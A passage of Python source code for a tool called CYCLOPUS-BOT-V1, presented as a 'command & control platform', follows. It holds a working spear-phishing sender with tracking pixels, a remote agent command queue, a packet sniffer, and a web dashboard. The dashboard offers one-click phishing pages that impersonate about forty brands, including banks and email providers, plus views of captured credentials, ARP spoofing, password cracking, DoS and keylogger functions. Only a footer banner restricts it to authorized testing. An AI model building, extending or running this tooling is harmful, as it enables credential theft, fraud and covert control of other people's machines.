            'scheduled_time': scheduled_time,
            'created_at': datetime.datetime.now().isoformat(),
            'status': 'draft'
        }
        
        # Store campaign in database
        for target in targets:
            email_data = {
                'id': f"{campaign_id}_{target.get('email', 'unknown')}",
                'target_email': target.get('email', ''),
                'subject': subject,
                'body': template,
                'template': template,
                'sent_at': datetime.datetime.now().isoformat(),
                'status': 'draft',
                'opened': 0,
                'clicked': 0
            }
            self.db.save_spear_phishing(email_data)
        
        return campaign_data
    
    def send_campaign(self, campaign_id: str) -> Dict:
        smtp_server = self.config.get('spear_phishing.smtp_server', '')
        smtp_port = self.config.get('spear_phishing.smtp_port', 587)
        smtp_username = self.config.get('spear_phishing.smtp_username', '')
        smtp_password = self.config.get('spear_phishing.smtp_password', '')
        
        if not smtp_server:
            return {'success': False, 'error': 'SMTP server not configured'}
        
        # Get campaigns from database
        campaigns = self.db.get_spear_phishing()
        sent_count = 0
        
        for campaign in campaigns:
            if campaign.get('id', '').startswith(campaign_id):
                try:
                    msg = email.message.EmailMessage()
                    msg['Subject'] = campaign['subject']
                    msg['From'] = campaign.get('from_email', smtp_username)
                    msg['To'] = campaign['target_email']
                    
                    template = campaign.get('template', '')
                    tracking_url = f"{self.config.get('spear_phishing.tracking_server', 'http://localhost:5000')}/track/{campaign_id}/{campaign['target_email']}"
                    template += f'\n<img src="{tracking_url}" width="1" height="1">'
                    
                    if '<html' in template.lower():
                        msg.set_content(template, subtype='html')
                    else:
                        msg.set_content(template)
                    
                    with smtplib.SMTP(smtp_server, smtp_port) as server:
                        server.starttls()
                        server.login(smtp_username, smtp_password)
                        server.send_message(msg)
                    
                    sent_count += 1
                except Exception as e:
                    print(f"Failed to send to {campaign.get('target_email', 'unknown')}: {e}")
        
        return {
            'success': True,
            'campaign_id': campaign_id,
            'sent_count': sent_count
        }
    
    def track_open(self, campaign_id: str, target_email: str):
        pass
    
    def track_click(self, campaign_id: str, target_email: str):
        pass
    
    def get_campaigns(self) -> List[Dict]:
        return self.db.get_spear_phishing()

# =====================
# AGENT ENGINE
# =====================
class AgentEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.heartbeat_timer = None
    
    def register_agent(self, name: str, hostname: str, ip: str, os_info: str) -> Dict:
        agent_id = str(uuid.uuid4())[:8]
        self.db.register_agent(agent_id, name, hostname, ip, os_info)
        return {
            'success': True,
            'agent_id': agent_id,
            'name': name,
            'ip_address': ip,
            'message': f'Agent {name} registered'
        }
    
    def send_command(self, agent_id: str, command: str) -> bool:
        return self.db.add_agent_command(agent_id, command)
    
    def poll_commands(self, agent_id: str) -> List[Dict]:
        return self.db.get_pending_agent_commands(agent_id)
    
    def submit_result(self, command_id: int, result: str, status: str = "completed"):
        self.db.update_agent_command_result(command_id, result, status)
    
    def start_heartbeat(self):
        def heartbeat():
            agents = self.db.get_agents()
            for agent in agents:
                self.db.update_agent_heartbeat(agent['id'])
            
            if self.heartbeat_timer:
                self.heartbeat_timer.cancel()
            
            interval = self.config.get('agent.heartbeat_interval', 30)
            self.heartbeat_timer = threading.Timer(interval, heartbeat)
            self.heartbeat_timer.daemon = True
            self.heartbeat_timer.start()
        
        heartbeat()
    
    def stop_heartbeat(self):
        if self.heartbeat_timer:
            self.heartbeat_timer.cancel()
            self.heartbeat_timer = None
    
    def get_agents(self) -> List[Dict]:
        return self.db.get_agents()
    
    def get_agent(self, agent_id: str) -> Optional[Dict]:
        try:
            agents = self.db.get_agents()
            for agent in agents:
                if agent['id'] == agent_id:
                    return agent
            return None
        except:
            return None

# =====================
# NETWORK MONITOR
# =====================
class NetworkMonitor:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running = False
        self.packet_count = 0
        self.interface = config.get('network_monitor.interface', 'eth0')
        self.promiscuous = config.get('network_monitor.promiscuous', False)
        self.capture_limit = config.get('network_monitor.packet_capture_limit', 1000)
    
    def start(self):
        self.running = True
        threading.Thread(target=self._monitor_loop, daemon=True).start()
        print(f"{Colors.GREEN}✅ Network monitor started on {self.interface}{Colors.RESET}")
    
    def stop(self):
        self.running = False
    
    def _monitor_loop(self):
        while self.running:
            try:
                if SCAPY_AVAILABLE:
                    self._scapy_monitor()
                else:
                    self._socket_monitor()
            except Exception as e:
                logger.error(f"Network monitor error: {e}")
                time.sleep(5)
    
    def _scapy_monitor(self):
        from scapy.all import sniff
        sniff(iface=self.interface, prn=self._process_packet, store=0,
              promisc=self.promiscuous, count=self.capture_limit)
    
    def _socket_monitor(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
        sock.bind((self.interface, 0))
        sock.settimeout(1)
        
        while self.running:
            try:
                data, addr = sock.recvfrom(65535)
                self._process_packet(data)
            except socket.timeout:
                continue
            except Exception as e:
                logger.error(f"Socket monitor error: {e}")
                break
        
        sock.close()
    
    def _process_packet(self, packet):
        self.packet_count += 1
        
        try:
            if SCAPY_AVAILABLE and hasattr(packet, 'haslayer'):
                if packet.haslayer(IP):
                    ip = packet[IP]
                    src_ip = ip.src
                    dst_ip = ip.dst
                    protocol = ip.proto
                    size = len(packet)
                    
                    src_port = 0
                    dst_port = 0
                    payload = ""
                    
                    if packet.haslayer(TCP):
                        src_port = packet[TCP].sport
                        dst_port = packet[TCP].dport
                        protocol = "TCP"
                    elif packet.haslayer(UDP):
                        src_port = packet[UDP].sport
                        dst_port = packet[UDP].dport
                        protocol = "UDP"
                    elif packet.haslayer(ICMP):
                        protocol = "ICMP"
                    
                    self.db.save_network_packet(src_ip, dst_ip, src_port, dst_port, protocol, size, str(packet))
            else:
                self.db.save_network_packet("unknown", "unknown", 0, 0, "unknown", len(packet), "")
        except Exception as e:
            logger.error(f"Packet processing error: {e}")
    
    def get_packets(self, limit: int = 100) -> List[Dict]:
        return self.db.get_network_packets(limit)
    
    def get_statistics(self) -> Dict:
        packets = self.db.get_network_packets(1000)
        stats = {
            'total_packets': len(packets),
            'protocols': Counter(),
            'top_sources': Counter(),
            'top_dests': Counter()
        }
        
        for p in packets:
            stats['protocols'][p.get('protocol', 'unknown')] += 1
            stats['top_sources'][p.get('source_ip', 'unknown')] += 1
            stats['top_dests'][p.get('dest_ip', 'unknown')] += 1
        
        return stats

# =====================
# WEB DASHBOARD
# =====================
class WebDashboard:
    def __init__(self, command_handler, db: DatabaseManager, config: ConfigManager,
                 ip_monitor=None, keylogger=None):
        self.handler = command_handler
        self.db = db
        self.config = config
        self.ip_monitor = ip_monitor
        self.keylogger = keylogger
        self.app = None
        self.socketio = None
        self.running = False
    
    def create_app(self):
        if not WEB_AVAILABLE:
            return None
        
        app = Flask(__name__)
        app.config['SECRET_KEY'] = self.config.get('web.secret_key', secrets.token_hex(32))
        CORS(app)
        
        socketio = SocketIO(app, cors_allowed_origins="*")
        
        # Gradient Theme HTML Template (Cyan, Purple, Blue)
        TEMPLATE = '''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>🐙 CYCLOPUS-BOT-V1 - Cybersecurity Dashboard</title>
            <style>
                :root {
                    --dark-bg: #0a0e1a;
                    --dark-panel: #111a2e;
                    --dark-card: #0d1528;
                    --cyan-primary: #00d4ff;
                    --cyan-dark: #0099cc;
                    --cyan-glow: rgba(0, 212, 255, 0.2);
                    --blue-primary: #0066ff;
                    --purple-primary: #8b5cf6;
                    --purple-glow: rgba(139, 92, 246, 0.2);
                    --white: #ffffff;
                    --gray: #8899bb;
                    --light-gray: #aabbdd;
                }
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    font-family: 'Courier New', monospace;
                    background: var(--dark-bg);
                    color: var(--white);
                    min-height: 100vh;
                    background: radial-gradient(ellipse at 50% 0%, #0a1a2e 0%, #0a0e1a 70%);
                }
                .header {
                    background: linear-gradient(180deg, #0a1a2e 0%, #0a0e1a 100%);
                    padding: 20px;
                    text-align: center;
                    border-bottom: 2px solid var(--cyan-primary);
                    box-shadow: 0 0 30px var(--cyan-glow);
                }
                .header h1 {
                    font-size: 2.8em;
                    color: var(--white);
                    text-shadow: 0 0 20px var(--cyan-glow);
                    letter-spacing: 6px;
                }
                .header h1 span { color: var(--purple-primary); }
                .header p {
                    color: var(--gray);
                    font-size: 0.9em;
                    letter-spacing: 2px;
                }
                .container {
                    max-width: 1400px;
                    margin: 0 auto;
                    padding: 20px;
                }
                .stats-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
                    gap: 15px;
                    margin-bottom: 30px;
                }
                .stat-card {
                    background: var(--dark-panel);
                    border: 1px solid var(--cyan-dark);
                    border-radius: 8px;
                    padding: 20px;
                    text-align: center;
                    backdrop-filter: blur(10px);
                    transition: all 0.3s;
                }
                .stat-card:hover {
                    border-color: var(--purple-primary);
                    box-shadow: 0 0 30px var(--purple-glow);
                    transform: translateY(-2px);
                }
                .stat-card h3 {
                    font-size: 2.5em;
                    color: var(--purple-primary);
                    font-weight: normal;
                    text-shadow: 0 0 20px var(--purple-glow);
                }
                .stat-card p {
                    margin-top: 10px;
                    opacity: 0.6;
                    color: var(--gray);
                    font-size: 0.9em;
                }
                .section {
                    background: var(--dark-panel);
                    border: 1px solid var(--cyan-dark);
                    border-radius: 8px;
                    padding: 20px;
                    margin-bottom: 20px;
                    backdrop-filter: blur(10px);
                }
                .section h2 {
                    margin-bottom: 15px;
                    color: var(--white);
                    font-weight: normal;
                    letter-spacing: 3px;
                    border-bottom: 1px solid var(--cyan-dark);
                    padding-bottom: 10px;
                }
                table {
                    width: 100%;
                    border-collapse: collapse;
                    color: var(--white);
                }
                th, td {
                    padding: 12px;
                    text-align: left;
                    border-bottom: 1px solid var(--cyan-dark);
                }
                th {
                    background: var(--dark-bg);
                    color: var(--purple-primary);
                    font-weight: normal;
                    letter-spacing: 2px;
                }
                .command-input {
                    width: 100%;
                    padding: 15px;
                    background: var(--dark-bg);
                    border: 1px solid var(--cyan-dark);
                    border-radius: 4px;
                    color: var(--white);
                    font-size: 16px;
                    font-family: 'Courier New', monospace;
                    margin-bottom: 10px;
                }
                .command-input:focus {
                    outline: none;
                    border-color: var(--purple-primary);
                    box-shadow: 0 0 20px var(--purple-glow);
                }
                button {
                    background: var(--cyan-dark);
                    color: var(--white);
                    border: 1px solid var(--purple-primary);
                    padding: 12px 30px;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 16px;
                    font-family: 'Courier New', monospace;
                    transition: all 0.3s;
                }
                button:hover {
                    background: var(--purple-primary);
                    border-color: var(--white);
                    box-shadow: 0 0 30px var(--purple-glow);
                }
                .output {
                    background: var(--dark-bg);
                    border-radius: 4px;
                    padding: 15px;
                    font-family: 'Courier New', monospace;
                    margin-top: 15px;
                    white-space: pre-wrap;
                    max-height: 400px;
                    overflow-y: auto;
                    color: var(--white);
                    border: 1px solid var(--cyan-dark);
                }
                .status-badge {
                    display: inline-block;
                    padding: 4px 8px;
                    border-radius: 2px;
                    font-size: 12px;
                }
                .status-online { background: rgba(0, 212, 255, 0.15); color: var(--cyan-primary); }
                .status-offline { background: rgba(0, 212, 255, 0.05); color: var(--gray); }
                .severity-critical { background: rgba(255, 0, 0, 0.3); color: #ff4444; }
                .severity-high { background: rgba(255, 100, 0, 0.2); color: #ff6600; }
                .severity-medium { background: rgba(255, 200, 0, 0.15); color: #ffcc00; }
                .severity-low { background: rgba(139, 92, 246, 0.1); color: var(--purple-primary); }
                ::-webkit-scrollbar { width: 6px; }
                ::-webkit-scrollbar-track { background: var(--dark-bg); }
                ::-webkit-scrollbar-thumb { background: var(--purple-primary); border-radius: 3px; }
                .glow { animation: glow 2s ease-in-out infinite; }
                @keyframes glow {
                    0% { box-shadow: 0 0 5px var(--cyan-glow); }
                    50% { box-shadow: 0 0 30px var(--cyan-glow); }
                    100% { box-shadow: 0 0 5px var(--cyan-glow); }
                }
                .warning-banner {
                    background: var(--dark-panel);
                    padding: 10px;
                    text-align: center;
                    color: var(--gray);
                    font-size: 12px;
                    border-top: 1px solid var(--cyan-dark);
                    letter-spacing: 2px;
                }
                .terminal-cursor {
                    display: inline-block;
                    width: 10px;
                    height: 20px;
                    background: var(--purple-primary);
                    animation: blink 1s infinite;
                }
                @keyframes blink {
                    0%, 50% { opacity: 1; }
                    51%, 100% { opacity: 0; }
                }
                .quick-commands {
                    display: flex;
                    flex-wrap: wrap;
                    gap: 6px;
                    margin-top: 10px;
                }
                .quick-btn {
                    background: #0d1528;
                    border: 1px solid var(--cyan-dark);
                    color: var(--gray);
                    padding: 4px 12px;
                    border-radius: 4px;
                    font-size: 11px;
                    font-family: 'Courier New', monospace;
                    cursor: pointer;
                    transition: all 0.2s;
                }
                .quick-btn:hover {
                    border-color: var(--purple-primary);
                    color: var(--purple-primary);
                    background: #1a2a4a;
                }
                .tab-bar {
                    display: flex;
                    gap: 10px;
                    margin-bottom: 20px;
                    flex-wrap: wrap;
                }
                .tab {
                    padding: 10px 20px;
                    background: rgba(255,255,255,0.05);
                    border: 1px solid var(--cyan-dark);
                    border-radius: 8px;
                    cursor: pointer;
                    transition: all 0.3s;
                    font-size: 13px;
                }
                .tab:hover, .tab.active {
                    border-color: var(--purple-primary);
                    background: rgba(139, 92, 246, 0.1);
                    color: var(--purple-primary);
                }
                .tab-content { display: none; }
                .tab-content.active { display: block; }
                .phish-btn {
                    display: inline-block;
                    background: #0d1528;
                    border: 1px solid var(--purple-primary);
                    color: var(--purple-primary);
                    padding: 4px 12px;
                    border-radius: 4px;
                    font-size: 11px;
                    font-family: 'Courier New', monospace;
                    cursor: pointer;
                    transition: all 0.2s;
                    margin: 2px;
                }
                .phish-btn:hover {
                    background: var(--purple-primary);
                    color: #fff;
                }
                .platform-badge {
                    display: inline-block;
                    padding: 2px 8px;
                    border-radius: 4px;
                    font-size: 10px;
                    margin: 2px;
                }
                .platform-discord { background: #5865f2; color: #fff; }
                .platform-telegram { background: #2aabee; color: #fff; }
                .platform-slack { background: #611f69; color: #fff; }
                .platform-signal { background: #3f7e9c; color: #fff; }
                .platform-whatsapp { background: #25d366; color: #fff; }
                .platform-googlechat { background: #4285f4; color: #fff; }
                .platform-imessage { background: #34c759; color: #fff; }
            </style>
            <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
            <script>
                var socket = io();
                
                function executeCommand() {
                    var command = document.getElementById('command').value;
                    if (command) {
                        fetch('/api/command', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ command: command })
                        })
                        .then(response => response.json())
                        .then(data => {
                            var outputDiv = document.getElementById('command-output');
                            if (data.success) {
                                outputDiv.innerHTML = '<span style="color:var(--purple-primary)">$></span> ' + command + '<br>' +
                                                      '<span style="color:var(--purple-primary)">output></span><br>' + data.output + '<br>' +
                                                      '<span style="color:var(--purple-primary)">time></span> ' + data.execution_time + 's';
                            } else {
                                outputDiv.innerHTML = '<span style="color:#ff4444">error></span> ' + data.error;
                            }
                            loadStats();
                        });
                    }
                }
                
                function sendQuickCommand(cmd) {
                    document.getElementById('command').value = cmd;
                    executeCommand();
                }
                
                function switchTab(tabName) {
                    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
                    document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
                    document.getElementById('tab-' + tabName).classList.add('active');
                    document.querySelector('[data-tab="' + tabName + '"]').classList.add('active');
                }
                
                document.addEventListener('keydown', function(e) {
                    if (e.key === 'Enter') {
                        executeCommand();
                    }
                });
                
                function loadStats() {
                    fetch('/api/stats')
                        .then(response => response.json())
                        .then(data => {
                            document.getElementById('statCommands').textContent = data.total_commands || 0;
                            document.getElementById('statThreats').textContent = data.total_threats || 0;
                            document.getElementById('statBlocked').textContent = data.blocked_ips || 0;
                            document.getElementById('statCreds').textContent = data.captured_credentials || 0;
                            document.getElementById('statCracking').textContent = data.total_cracking_jobs || 0;
                            document.getElementById('statARP').textContent = data.total_arp_spoofs || 0;
                            document.getElementById('statEmails').textContent = data.total_emails || 0;
                            document.getElementById('statPDF').textContent = data.total_pdf_reports || 0;
                            document.getElementById('statTemplates').textContent = data.total_phishing_links || 0;
                        });
                }
                
                function loadThreats() {
                    fetch('/api/threats')
                        .then(response => response.json())
                        .then(data => {
                            var html = '';
                            data.threats.forEach(function(threat) {
                                var severityClass = 'severity-' + threat.severity;
                                html += '<tr><td>' + threat.timestamp + '</td><td>' + threat.threat_type + '</td><td>' + threat.source_ip + '</td><td><span class="status-badge ' + severityClass + '">' + threat.severity.toUpperCase() + '</span></td></tr>';
                            });
                            document.getElementById('threats-table').innerHTML = html;
                        });
                }
                
                function loadPlatforms() {
                    fetch('/api/platforms')
                        .then(response => response.json())
                        .then(data => {
                            var html = '';
                            data.platforms.forEach(function(p) {
                                var platformClass = 'platform-' + p.name;
                                html += '<span class="platform-badge ' + platformClass + '">' + p.name + ': ' + (p.enabled ? '✅' : '❌') + '</span> ';
                            });
                            document.getElementById('platforms').innerHTML = html;
                        });
                }
                
                document.addEventListener('DOMContentLoaded', function() {
                    loadStats();
                    loadThreats();
                    loadPlatforms();
                    setInterval(loadStats, 10000);
                    setInterval(loadThreats, 10000);
                    setInterval(loadPlatforms, 30000);
                });
            </script>
        </head>
        <body>
            <div class="header glow">
                <h1>🐙 CYCLOPUS<span>-BOT-V1</span></h1>
                <p>▸ ULTIMATE CYBERSECURITY COMMAND & CONTROL PLATFORM</p>
            </div>
            <div class="container">
                <div class="stats-grid">
                    <div class="stat-card"><h3 id="statCommands">0</h3><p>COMMANDS</p></div>
                    <div class="stat-card"><h3 id="statThreats">0</h3><p>THREATS</p></div>
                    <div class="stat-card"><h3 id="statBlocked">0</h3><p>BLOCKED IPS</p></div>
                    <div class="stat-card"><h3 id="statCreds">0</h3><p>CREDENTIALS</p></div>
                    <div class="stat-card"><h3 id="statCracking">0</h3><p>CRACKING JOBS</p></div>
                    <div class="stat-card"><h3 id="statARP">0</h3><p>ARP SPOOFS</p></div>
                    <div class="stat-card"><h3 id="statEmails">0</h3><p>EMAILS</p></div>
                    <div class="stat-card"><h3 id="statPDF">0</h3><p>PDF REPORTS</p></div>
                </div>

                <div class="tab-bar">
                    <div class="tab active" data-tab="command" onclick="switchTab('command')">🚀 Command Center</div>
                    <div class="tab" data-tab="phishing" onclick="switchTab('phishing')">🎣 Phishing Templates</div>
                    <div class="tab" data-tab="network" onclick="switchTab('network')">🕸️ Network Tools</div>
                    <div class="tab" data-tab="threats" onclick="switchTab('threats')">🚨 Threats</div>
                </div>

                <div id="tab-command" class="tab-content active">
                    <div class="section">
                        <h2>🚀 COMMAND CENTER</h2>
                        <div style="display:flex; gap:10px;">
                            <span style="color:var(--purple-primary); font-size:20px;">$></span>
                            <input type="text" id="command" class="command-input" placeholder="Enter command... (e.g., ping 8.8.8.8, nmap_quick 192.168.1.1, help)" style="flex:1;">
                            <button onclick="executeCommand()">EXECUTE</button>
                        </div>
                        <div class="quick-commands">
                            <button class="quick-btn" onclick="sendQuickCommand('help')">help</button>
                            <button class="quick-btn" onclick="sendQuickCommand('status')">status</button>
                            <button class="quick-btn" onclick="sendQuickCommand('system')">system</button>
                            <button class="quick-btn" onclick="sendQuickCommand('threats')">threats</button>
                            <button class="quick-btn" onclick="sendQuickCommand('ping 8.8.8.8')">ping</button>
                            <button class="quick-btn" onclick="sendQuickCommand('nmap_quick 192.168.1.1')">nmap</button>
                            <button class="quick-btn" onclick="sendQuickCommand('crack_list')">crack_list</button>
                            <button class="quick-btn" onclick="sendQuickCommand('arp_status')">arp_status</button>
                            <button class="quick-btn" onclick="sendQuickCommand('nat_info')">nat_info</button>
                            <button class="quick-btn" onclick="sendQuickCommand('mac_scan')">mac_scan</button>
                            <button class="quick-btn" onclick="sendQuickCommand('traffic_status')">traffic</button>
                            <button class="quick-btn" onclick="sendQuickCommand('keylogger_status')">keylogger</button>
                            <button class="quick-btn" onclick="sendQuickCommand('docker_ps')">docker</button>
                            <button class="quick-btn" onclick="sendQuickCommand('email_list')">email</button>
                            <button class="quick-btn" onclick="sendQuickCommand('report_list')">reports</button>
                            <button class="quick-btn" onclick="sendQuickCommand('list_templates')">templates</button>
                        </div>
                        <div id="command-output" class="output" style="margin-top:10px;">
                            <span style="color:var(--purple-primary)">system></span> Ready for commands...
                            <span class="terminal-cursor"></span>
                        </div>
                    </div>
                </div>

                <div id="tab-phishing" class="tab-content">
                    <div class="section">
                        <h2>🎣 PHISHING TEMPLATES</h2>
                        <div style="margin-bottom:10px;">
                            <span style="color:var(--gray);font-size:12px;">Click a template to generate a phishing link</span>
                        </div>
                        <div id="phishing-templates">
                            <button class="phish-btn" onclick="sendQuickCommand('phish_facebook')">Facebook</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_instagram')">Instagram</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_twitter')">Twitter</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_gmail')">Gmail</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_linkedin')">LinkedIn</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_microsoft')">Microsoft</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_google')">Google</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_apple')">Apple</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_paypal')">PayPal</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_amazon')">Amazon</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_netflix')">Netflix</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_spotify')">Spotify</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_whatsapp')">WhatsApp</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_telegram')">Telegram</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_discord')">Discord</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_github')">GitHub</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_slack')">Slack</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_zoom')">Zoom</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_teams')">Teams</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_dropbox')">Dropbox</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_adobe')">Adobe</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_steam')">Steam</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_roblox')">Roblox</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_twitch')">Twitch</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_xbox')">Xbox</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_playstation')">PlayStation</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_cashapp')">Cash App</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_venmo')">Venmo</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_chase')">Chase</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_wellsfargo')">Wells Fargo</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_office365')">Office 365</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_onedrive')">OneDrive</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_icloud')">iCloud</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_pinterest')">Pinterest</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_reddit')">Reddit</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_snapchat')">Snapchat</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_tiktok')">TikTok</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_tinder')">Tinder</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_bumble')">Bumble</button>
                            <button class="phish-btn" onclick="sendQuickCommand('phish_custom')">Custom</button>
                        </div>
                        <div style="margin-top:15px;">
                            <button class="quick-btn" onclick="sendQuickCommand('list_templates')">📋 List All Templates</button>
                            <button class="quick-btn" onclick="sendQuickCommand('phish_creds')">🔑 View Captured Credentials</button>
                            <button class="quick-btn" onclick="sendQuickCommand('phish_start')">▶️ Start Server</button>
                            <button class="quick-btn" onclick="sendQuickCommand('phish_stop')">⏹️ Stop Server</button>
                        </div>
                    </div>
                </div>

                <div id="tab-network" class="tab-content">
                    <div class="section">
                        <h2>🕸️ NETWORK TOOLS</h2>
                        <div style="display:flex; flex-wrap:wrap; gap:6px;">
                            <button class="quick-btn" onclick="sendQuickCommand('ping 8.8.8.8')">Ping</button>
                            <button class="quick-btn" onclick="sendQuickCommand('traceroute 8.8.8.8')">Traceroute</button>
                            <button class="quick-btn" onclick="sendQuickCommand('nmap_quick 192.168.1.1')">Nmap Quick</button>
                            <button class="quick-btn" onclick="sendQuickCommand('nmap_full 192.168.1.1')">Nmap Full</button>
                            <button class="quick-btn" onclick="sendQuickCommand('nmap_os 192.168.1.1')">Nmap OS</button>
                            <button class="quick-btn" onclick="sendQuickCommand('nmap_vuln 192.168.1.1')">Nmap Vuln</button>
                            <button class="quick-btn" onclick="sendQuickCommand('wget https://example.com')">Wget</button>
                            <button class="quick-btn" onclick="sendQuickCommand('curl https://example.com')">Curl</button>
                            <button class="quick-btn" onclick="sendQuickCommand('netcat example.com 80')">Netcat</button>
                            <button class="quick-btn" onclick="sendQuickCommand('whois example.com')">Whois</button>
                            <button class="quick-btn" onclick="sendQuickCommand('dns example.com')">DNS</button>
                            <button class="quick-btn" onclick="sendQuickCommand('location 8.8.8.8')">IP Location</button>
                            <button class="quick-btn" onclick="sendQuickCommand('arp_status')">ARP Status</button>
                            <button class="quick-btn" onclick="sendQuickCommand('arp_history')">ARP History</button>
                            <button class="quick-btn" onclick="sendQuickCommand('mac_scan')">MAC Scan</button>
                            <button class="quick-btn" onclick="sendQuickCommand('traffic_types')">Traffic Types</button>
                            <button class="quick-btn" onclick="sendQuickCommand('traffic_status')">Traffic Status</button>
                            <button class="quick-btn" onclick="sendQuickCommand('netmon_status')">Netmon Status</button>
                            <button class="quick-btn" onclick="sendQuickCommand('nat_info')">NAT Info</button>
                        </div>
                    </div>
                </div>

                <div id="tab-threats" class="tab-content">
                    <div class="section">
                        <h2>🚨 RECENT THREATS</h2>
                        <div id="threats">
                            <table>
                                <thead><tr><th>TIME</th><th>TYPE</th><th>SOURCE IP</th><th>SEVERITY</th></tr></thead>
                                <tbody id="threats-table"></tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
            <div class="warning-banner">
                ⚠️ FOR AUTHORIZED SECURITY TESTING ONLY — ALL ACTIVITY IS LOGGED
            </div>
        </body>
        </html>
        '''
        
        @app.route('/')
        def index():
            return render_template_string(TEMPLATE)
        
        @app.route('/api/command', methods=['POST'])
        def api_command():
            data = request.json
            command = data.get('command', '')
            result = self.handler.execute(command, 'web', 'web_user')
            socketio.emit('command_result', {
                'command': command,
                'output': result.get('output', '')[:2000],
                'execution_time': result.get('execution_time', 0)
            })
            return jsonify(result)
        
        @app.route('/api/stats')
        def api_stats():
            stats = self.db.get_statistics()
            return jsonify(stats)
        
        @app.route('/api/threats')
        def api_threats():
            threats = self.db.get_recent_threats(20)
            return jsonify({'threats': threats})
        
        @app.route('/api/platforms')
        def api_platforms():
            platforms = [
                {'name': 'discord', 'enabled': DISCORD_AVAILABLE},
                {'name': 'telegram', 'enabled': TELETHON_AVAILABLE},
                {'name': 'slack', 'enabled': SLACK_AVAILABLE},
                {'name': 'signal', 'enabled': SIGNAL_AVAILABLE},
                {'name': 'whatsapp', 'enabled': WHATSAPP_AVAILABLE},
                {'name': 'googlechat', 'enabled': GOOGLE_CHAT_AVAILABLE},
                {'name': 'imessage', 'enabled': IMESSAGE_AVAILABLE}
            ]
            return jsonify({'platforms': platforms})
        
        self.app = app
        self.socketio = socketio
        return app
    
    def start(self):
        if not WEB_AVAILABLE:
            print(f"{Colors.YELLOW}⚠️ Flask not available. Web dashboard disabled.{Colors.RESET}")
            return
        
        app = self.create_app()
        if app:
            port = self.config.get('web.port', 5000)
            host = self.config.get('web.host', '0.0.0.0')
            thread = threading.Thread(target=lambda: self.socketio.run(app, host=host, port=port, debug=False), daemon=True)
            thread.start()
            self.running = True
            print(f"{Colors.PURPLE}✅ Web dashboard running at http://{host}:{port}{Colors.RESET}")

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    def __init__(self, db: DatabaseManager, ssh_manager: SSHManager = None,
                 traffic_gen: TrafficGeneratorEngine = None, nikto: NiktoScanner = None,
                 dos_engine: DOSEngine = None, spear_phishing: SpearPhishingEngine = None,
                 agent_engine: AgentEngine = None, network_monitor: NetworkMonitor = None,
                 keylogger: KeyloggerEngine = None, deployment_engine: DeploymentEngine = None,
                 cracking_engine: CrackingEngine = None,
                 arp_spoofing: ARPSpoofingEngine = None,
                 mac_manager: MACManager = None,
                 nat_info: NATInfoEngine = None,
                 platform_executor: PlatformCommandExecutor = None,
                 email_composer: EmailComposerEngine = None,
                 pdf_report: PDFReportGenerator = None,
                 docker_scanner: DockerScanner = None,
                 social_tools: SocialEngineeringTools = None):
        self.db = db
        self.ssh = ssh_manager
        self.traffic = traffic_gen
        self.nikto = nikto
        self.dos = dos_engine
        self.spear = spear_phishing
        self.agent = agent_engine
        self.network_monitor = network_monitor
        self.keylogger = keylogger
        self.deployment = deployment_engine
        self.cracking = cracking_engine
        self.arp_spoofing = arp_spoofing
        self.mac_manager = mac_manager
        self.nat_info = nat_info
        self.platform_executor = platform_executor
        self.email_composer = email_composer
        self.pdf_report = pdf_report
        self.docker_scanner = docker_scanner
        self.social = social_tools or SocialEngineeringTools(db)
        self.tools = NetworkTools()
        self.commands = self._build_commands()
    
